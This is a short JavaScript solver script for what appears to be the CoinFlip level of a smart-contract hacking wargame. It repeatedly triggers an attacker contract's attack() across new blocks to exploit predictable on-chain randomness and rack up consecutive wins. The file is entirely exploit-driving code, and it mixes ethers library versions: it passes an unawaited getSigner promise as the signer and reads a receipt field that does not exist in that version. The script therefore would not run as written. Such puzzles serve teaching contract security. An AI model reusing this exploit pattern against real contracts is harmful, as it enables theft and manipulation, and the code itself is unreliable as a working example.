import { ethers } from "ethers";

export default async function (providerUrl, ...args) {
  if (args.length < 2) {
    throw new Error("usage: solve 03 <coinFlipAddress> <predictContractAddress>");
  }

  const coinFlipAddress = args[0];
  const predictAddress = args[1];

  const provider = new ethers.JsonRpcProvider(providerUrl);
  const signer = provider.getSigner(0);

  // Minimal ABIs we need
  const predictAbi = ["function attack() external"];
  const coinFlipAbi = ["function consecutiveWins() external view returns (uint256)"];

  const predict = new ethers.Contract(predictAddress, predictAbi, signer);
  const coinFlip = new ethers.Contract(coinFlipAddress, coinFlipAbi, provider);

  console.log(`Calling Predict.attack() against CoinFlip: ${coinFlipAddress}`);
  console.log(`Predict contract: ${predictAddress}`);

  for (let i = 0; i < 10; i++) {
    const beforeBlock = await provider.getBlockNumber();

    // Send the attack tx (will use block.number - 1 inside Predict)
    const tx = await predict.attack();
    const receipt = await tx.wait();
    console.log(`tx mined (flip ${i + 1}): ${receipt.transactionHash}`);

    // Read consecutiveWins to report progress
    const wins = await coinFlip.consecutiveWins();
    console.log(`consecutiveWins after flip ${i + 1}: ${wins.toString()}`);

    // Wait for the next block (must be strictly greater than beforeBlock)
    if (i !== 9) { // no need to wait after the final iteration
      await new Promise((resolve) => {
        const listener = (blockNumber) => {
          if (blockNumber > beforeBlock) {
            provider.off("block", listener);
            resolve();
          }
        };
        provider.on("block", listener);
      });
    }
  }

  console.log("Done: attempted 10 flips.");
}


